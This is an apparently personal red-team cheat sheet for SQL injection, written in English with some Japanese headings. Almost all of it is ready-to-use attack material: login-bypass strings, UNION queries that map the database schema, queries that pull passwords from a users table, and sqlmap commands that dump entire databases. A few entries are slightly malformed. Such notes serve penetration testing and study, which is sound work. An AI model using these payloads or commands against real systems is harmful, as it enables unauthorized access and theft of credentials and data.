---
title: SQL injection
parent: Web Attack
grand_parent: Red Team
---

<details markdown="1">
<summary>SQL Injection</summary>
#### Validity Check
Enter `‘ or '1’='1';--` and use a tool such as **BurpSuite** to check if the behavior differs from that of a normal input.

```zsh
admin' or 1=1; --
```

```zsh
'or '1'='1 --
```

```
`"or "1"="1`
```

```
"or "1"="1" --
```

```
") or "1"="1 --`
```

```
"or 1=1 --
```

```zsh
kevin' OR 1=1 -- //
```

```
' or 1=1 in (select @@version) -- //
```

```
' OR 1=1 in (SELECT * FROM users) -- //
```

```
' or 1=1 in (SELECT password FROM users) -- //
```

```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

#### Determining the number of columns
*unionで結合する際は結合先のカラム数に合わせないとエラーになる*

```bash
' union select null, null, null, null, null;--
```

## Table名の取得
```zsh
' union select database(), table_name, null, null, null from information_schema.tables;-- 
```

## Column名の取得
```zsh
' union select database(), table_name, column_name, null, null from information_schema.columns;-- 
```

```bash
' or 1=1 order by 10 #
```

## sqlmap

| option | Description | Example |
| -u | URL | `sqlmap -u http://10.10.10.1/` |
| --batch | Disable interactive mode | `sqlmap -u URL --batch` |
| -dbs | Retrieve available database names | `sqlmap -u URL --dbs` |
| --tables | table list | `sqlmap -u URL -D --tables` |
| --dump | culm list | `sqlmap -u <target_URL> -D <database_name> -T <table_name> --dump` |
| --all | Retrieve all information | `sqlmap -u URL --all` |

```bash
sqlmap -u "http://<IP>/index.php?id=1" --dump --batch
```

```bash
sqlmap -r site.txt --dump --batch
```

##### Example:
MSSQL

```zsh
sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t --risk 3 --level 5 --batch
```

</details>
